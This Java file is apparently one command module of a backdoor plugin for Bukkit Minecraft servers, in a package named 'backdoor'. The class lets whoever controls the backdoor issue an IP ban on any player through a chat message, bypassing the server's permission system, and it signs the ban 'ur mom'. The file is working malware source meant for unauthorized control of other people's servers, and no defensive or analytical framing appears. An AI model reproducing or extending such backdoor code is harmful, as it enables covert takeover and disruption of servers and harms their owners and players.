package me.kmatias.backdoor.commands.bans;

import me.kmatias.backdoor.Command;
import me.kmatias.backdoor.RegisterCommand;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "ban-ip", aliases = {"ban-ip"})
public class BanIpCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getPlayer(args.get(0));
            String targetName = "";
            if (target == null) targetName = args.get(0);

            StringBuilder sb = new StringBuilder();
            for (int i = 1; i < args.size(); i++) {
                sb
                        .append(args.get(i))
                        .append(" ");
            }

            Bukkit.getBanList(BanList.Type.IP).addBan(target == null ? targetName : target.getAddress().getHostName(), sb.toString(), null, "ur mom");
        }
    }
}
